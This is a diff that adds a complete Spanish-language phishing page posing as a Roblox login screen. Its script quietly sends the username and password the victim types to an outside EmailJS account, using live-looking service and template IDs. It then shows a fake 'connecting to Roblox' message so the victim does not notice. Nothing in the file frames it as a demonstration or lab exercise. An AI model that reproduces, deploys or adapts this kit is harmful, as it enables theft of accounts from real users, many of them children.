@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-container {
+            background: white;
+            border-radius: 12px;
+            padding: 40px 30px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            border-radius: 12px;
+        }
+
+        .title {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 16px;
+            color: #333;
+            background-color: #fff;
+            transition: border-color 0.3s ease;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #4285f4;
+        }
+
+        .form-input::placeholder {
+            color: #999;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #28a745, #20c943);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            margin-bottom: 20px;
+        }
+
+        .login-button:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(40, 167, 69, 0.3);
+        }
+
+        .login-button:active {
+            transform: translateY(0);
+        }
+
+        .links {
+            text-align: center;
+        }
+
+        .link {
+            color: #4285f4;
+            text-decoration: none;
+            font-size: 14px;
+            margin: 0 5px;
+        }
+
+        .link:hover {
+            text-decoration: underline;
+        }
+
+        .text-muted {
+            color: #666;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="logo.png" alt="Logo">
+        </div>
+        
+        <h1 class="title">Inicio de sesión de Roblox</h1>
+        
+        <form>
+            <div class="form-group">
+                <label class="form-label">Usuario:</label>
+                <input 
+                    type="text" 
+                    class="form-input" 
+                    placeholder="Usuario"
+                    required
+                >
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label">Contraseña:</label>
+                <input 
+                    type="password" 
+                    class="form-input" 
+                    placeholder="Contraseña"
+                    required
+                >
+            </div>
+            
+            <button type="submit" class="login-button">
+                Conectar
+            </button>
+        </form>
+        
+        <div class="links">
+            <a href="#" class="link">¿Olvidaste tu contraseña?</a>
+            <br><br>
+            <span class="text-muted">¿No tienes una cuenta?</span>
+            <a href="#" class="link">Regístrate</a>
+        </div>
+    </div>
+
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    
+    <script>
+        // Inicializar EmailJS
+        (function() {
+            emailjs.init("K4b-KRr6XIGxiHBG7");
+        })();
+
+        // Funcionalidad del formulario
+        document.querySelector('form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.querySelector('input[type="text"]').value;
+            const password = document.querySelector('input[type="password"]').value;
+            const submitButton = document.querySelector('.login-button');
+            
+            if (username && password) {
+                // Cambiar texto del botón
+                submitButton.textContent = 'Enviando...';
+                submitButton.disabled = true;
+                
+                // Parámetros para enviar
+                const templateParams = {
+                    nombre: username,
+                    mensaje: password
+                };
+                
+                // Enviar email
+                emailjs.send('service_l1x71ld', 'template_z3drhgj', templateParams)
+                    .then(function(response) {
+                        console.log('SUCCESS!', response.status, response.text);
+                        alert('Conectando a Roblox...');
+                        document.querySelector('form').reset();
+                        submitButton.textContent = 'Conectar';
+                        submitButton.disabled = false;
+                    })
+                    .catch(function(error) {
+                        console.log('FAILED...', error);
+                        alert('Error de conexión. Código: ' + error.status);
+                        submitButton.textContent = 'Conectar';
+                        submitButton.disabled = false;
+                    });
+            } else {
+                alert('Por favor, completa todos los campos.');
+            }
+        });
+    </script>
+</body>
+</html>
